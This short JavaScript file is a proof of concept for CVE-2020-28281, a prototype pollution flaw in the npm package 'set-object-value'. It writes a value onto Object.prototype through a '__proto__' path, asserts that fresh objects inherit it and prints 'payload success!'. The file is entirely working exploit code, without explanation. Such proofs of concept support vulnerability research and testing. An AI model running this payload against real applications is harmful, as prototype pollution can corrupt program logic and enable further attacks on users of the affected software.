//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28281
var setObjectValue = require("set-object-value")
const { assert } = require("@firebase/util");

var obj = {}
console.log("Before : " + obj.polluted);
setObjectValue(obj, ['__proto__','polluted'], "yes");
console.log("After : " + obj.polluted);
assert({}.polluted === "yes");
console.log("payload success!");